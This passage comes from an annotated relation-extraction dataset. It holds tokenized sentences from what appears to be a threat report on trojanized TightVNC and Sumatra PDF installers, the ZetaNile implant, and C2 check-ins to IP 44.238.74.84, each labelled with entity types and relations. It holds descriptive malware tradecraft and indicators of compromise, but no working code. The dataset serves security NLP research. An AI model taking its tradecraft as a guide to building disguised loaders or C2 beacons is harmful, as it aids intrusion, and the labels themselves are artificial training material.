"decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [1, 1], "name": ".txt file", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "TightVNC Viewer", "pos": [18, 20], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [33, 33], "name": "remote hosts", "pos": [25, 27], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "backdoor", "pos": [36, 37], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "TightVNC Viewer", "pos": [49, 51], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "malware", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [78, 78], "name": "44.238.74.84", "pos": [12, 13], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [97, 97], "name": "IP", "pos": [31, 32], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [110, 110], "name": "server IP", "pos": [8, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [117, 117], "name": "DLL payload", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "TightVNC.exe", "pos": [18, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "recipient", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "executable file", "pos": [10, 12], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [167, 167], "name": "implant", "pos": [17, 18], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [174, 174], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [181, 181], "name": "backdoor", "pos": [31, 32], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [186, 186], "name": "PDF files", "pos": [36, 38], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "SecurePDF.exe", "pos": [0, 1], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [198, 198], "name": "ZetaNile implant", "pos": [9, 11], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [206, 206], "name": "themed file", "pos": [17, 19], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [215, 215], "name": "PDF", "pos": [2, 3], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [224, 224], "name": "decryption key", "pos": [11, 13], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "payload", "pos": [18, 19], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [234, 234], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [243, 243], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "26_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 1, "t": 3}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 7}, {"r": "RF", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "ST", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "RF", "evidence": [2, 3], "h": 6, "t": 9}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 10}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "EX", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "FR", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [6], "h": 19, "t": 21}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "WR", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "WR", "evidence": [7], "t": 24, "h": 26}, {"r": "RD", "evidence": [7], "t": 25, "h": 26}, {"r": "CO", "evidence": [7], "h": 22, "t": 25}]}, {"title": "052-26", "sents": [["As", "part", "of", "the", "threat", "actor", "'", "s", "latest", "malware", "technique", "to", "evade", "traditional", "defenses", ",", "the", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", ",", "and", "it", "'", "s", "configured", "to", "install", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "in", "the", "TightVNC", "Viewer", ",", "as", "shown", "in", "Figure", "5", ":"], ["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "TightVNC Viewer", "pos": [18, 20], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [25, 25], "name": "remote hosts", "pos": [25, 27], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "backdoor", "pos": [36, 37], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [42, 42], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [42, 43], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [49, 49], "name": "TightVNC Viewer", "pos": [49, 51], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [59, 59], "name": "malware", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [70, 70], "name": "44.238.74.84", "pos": [12, 13], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [89, 89], "name": "IP", "pos": [31, 32], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [102, 102], "name": "server IP", "pos": [8, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [109, 109], "name": "DLL payload", "pos": [15, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [112, 112], "name": "TightVNC.exe", "pos": [18, 19], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "recipient", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [137, 137], "name": "executable file", "pos": [10, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [145, 145], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [159, 159], "name": "implant", "pos": [17, 18], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [166, 166], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [173, 173], "name": "backdoor", "pos": [31, 32], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [178, 178], "name": "PDF files", "pos": [36, 38], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [181, 181], "name": "SecurePDF.exe", "pos": [0, 1], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [190, 190], "name": "ZetaNile implant", "pos": [9, 11], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [198, 198], "name": "themed file", "pos": [17, 19], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [207, 207], "name": "PDF", "pos": [2, 3], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [216, 216], "name": "decryption key", "pos": [11, 13], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [223, 223], "name": "payload", "pos": [18, 19], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [226, 226], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [235, 235], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [252, 252], "name": "malware", "pos": [8, 9], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [262, 262], "name": "hostname", "pos": [18, 19], "index": "27_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [264, 264], "name": "device information", "pos": [20, 22], "index": "28_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [272, 272], "name": "C2 communication server", "pos": [28, 31], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [279, 279], "name": "C2 check-in process", "pos": [35, 38], "index": "30_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "ST", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 7}, {"r": "RF", "evidence": [1], "h": 5, "t": 7}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "RD", "evidence": [1, 2], "h": 5, "t": 9}, {"r": "CO", "evidence": [1], "h": 6, "t": 7}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 5, "t": 26}, {"r": "WR", "evidence": [2], "t": 9, "h": 10}, {"r": "EX", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "FR", "evidence": [5], "h": 18, "t": 19}, {"r": "RD", "evidence": [5], "h": 18, "t": 20}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 21}, {"r": "WR", "evidence": [5, 6], "h": 19, "t": 23}, {"r": "WR", "evidence": [6], "t": 23, "h": 25}, {"r": "RD", "evidence": [6], "t": 24, "h": 25}, {"r": "CO", "evidence": [6], "h": 21, "t": 24}, {"r": "RD", "evidence": [7], "h": 26, "t": 27}, {"r": "RD", "evidence": [7], "h": 26, "t": 28}, {"r": "ST", "evidence": [7], "h": 26, "t": 29}, {"r": "RD", "evidence": [7], "t": 28, "h": 30}]}, {"title": "052-27", "sents": [["The", "malware", "was", "configured", "to", "send", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establish", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", "."], ["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "can", "install", "additional", "malware", "onto", "the", "compromised", "devices", "using", "the", "C2", "communication", "as", "needed", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [12, 12], "name": "44.238.74.84", "pos": [12, 13], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [31, 31], "name": "IP", "pos": [31, 32], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [44, 44], "name": "server IP", "pos": [8, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "DLL payload", "pos": [15, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "TightVNC.exe", "pos": [18, 19], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "recipient", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "executable file", "pos": [10, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "implant", "pos": [17, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [108, 108], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "backdoor", "pos": [31, 32], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [120, 120], "name": "PDF files", "pos": [36, 38], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [123, 123], "name": "SecurePDF.exe", "pos": [0, 1], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "ZetaNile implant", "pos": [9, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "themed file", "pos": [17, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "PDF", "pos": [2, 3], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [158, 158], "name": "decryption key", "pos": [11, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [165, 165], "name": "payload", "pos": [18, 19], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [177, 177], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [194, 194], "name": "malware", "pos": [8, 9], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [204, 204], "name": "hostname", "pos": [18, 19], "index": "22_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [206, 206], "name": "device information", "pos": [20, 22], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [214, 214], "name": "C2 communication server", "pos": [28, 31], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [221, 221], "name": "C2 check-in process", "pos": [35, 38], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [226, 226], "name": "attackers", "pos": [1, 2], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [229, 229], "name": "additional malware", "pos": [4, 6], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [237, 237], "name": "C2 communication", "pos": [12, 14], "index": "28_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 21}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 13}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [4], "h": 13, "t": 15}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "WR", "evidence": [5], "t": 18, "h": 20}, {"r": "RD", "evidence": [5], "t": 19, "h": 20}, {"r": "CO", "evidence": [5], "h": 16, "t": 19}, {"r": "RD", "evidence": [6], "h": 21, "t": 22}, {"r": "RD", "evidence": [6], "h": 21, "t": 23}, {"r": "ST", "evidence": [6], "h": 21, "t": 24}, {"r": "RD", "evidence": [6], "t": 23, "h": 25}, {"r": "FR", "evidence": [7], "h": 26, "t": 27}, {"r": "FR", "evidence": [7], "h": 26, "t": 28}]}, {"title": "052-28", "sents": [["Once", "a", "successful", "connection", "is", "established", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "a", "known", "compromised", "domain", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "can", "install", "additional", "malware", "onto", "the", "compromised", "devices", "using", "the", "C2", "communication", "as", "needed", "."], ["Within", "the", "trojanized", "version", "of", "muPDF/Subliminal", "Recording", "installer", ",", "setup.exe", "is", "configured", "to", "check", "if", "the", "file", "path", "ISSetupPrerequisites\\Setup64.exe", "exists", "and", "write", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", "after", "extracting", "the", "embedded", "executable", "inside", "setup.exe", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "server IP", "pos": [8, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "DLL payload", "pos": [15, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "TightVNC.exe", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "recipient", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "executable file", "pos": [10, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "implant", "pos": [17, 18], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [79, 79], "name": "backdoor", "pos": [31, 32], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "PDF files", "pos": [36, 38], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "SecurePDF.exe", "pos": [0, 1], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [96, 96], "name": "ZetaNile implant", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "themed file", "pos": [17, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "PDF", "pos": [2, 3], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "decryption key", "pos": [11, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "payload", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [158, 158], "name": "malware", "pos": [8, 9], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [168, 168], "name": "hostname", "pos": [18, 19], "index": "19_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [170, 170], "name": "device information", "pos": [20, 22], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [178, 178], "name": "C2 communication server", "pos": [28, 31], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [185, 185], "name": "C2 check-in process", "pos": [35, 38], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [190, 190], "name": "attackers", "pos": [1, 2], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [193, 193], "name": "additional malware", "pos": [4, 6], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [201, 201], "name": "C2 communication", "pos": [12, 14], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [211, 211], "name": "muPDF/Subliminal Recording installer", "pos": [5, 8], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "setup.exe", "pos": [9, 10], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [224, 224], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [18, 19], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [228, 228], "name": "C : \\colrctl\\colorui.dll", "pos": [22, 25], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "RD", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "WR", "evidence": [4], "t": 15, "h": 17}, {"r": "RD", "evidence": [4], "t": 16, "h": 17}, {"r": "CO", "evidence": [4], "h": 13, "t": 16}, {"r": "RD", "evidence": [5], "h": 18, "t": 19}, {"r": "RD", "evidence": [5], "h": 18, "t": 20}, {"r": "ST", "evidence": [5], "h": 18, "t": 21}, {"r": "RD", "evidence": [5], "t": 20, "h": 22}, {"r": "FR", "evidence": [6], "h": 23, "t": 24}, {"r": "FR", "evidence": [6], "h": 23, "t": 25}, {"r": "FR", "evidence": [7], "h": 26, "t": 27}, {"r": "RD", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 29}]}, {"title": "052-29", "sents": [["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "to", "run", "."], ["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "can", "install", "additional", "malware", "onto", "the", "compromised", "devices", "using", "the", "C2", "communication", "as", "needed", "."], ["Within", "the", "trojanized", "version", "of", "muPDF/Subliminal", "Recording", "installer", ",", "setup.exe", "is", "configured", "to", "check", "if", "the", "file", "path", "ISSetupPrerequisites\\Setup64.exe", "exists", "and", "write", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", "after", "extracting", "the", "embedded", "executable", "inside", "setup.exe", "."], ["It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "recipient", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "executable file", "pos": [10, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "implant", "pos": [17, 18], 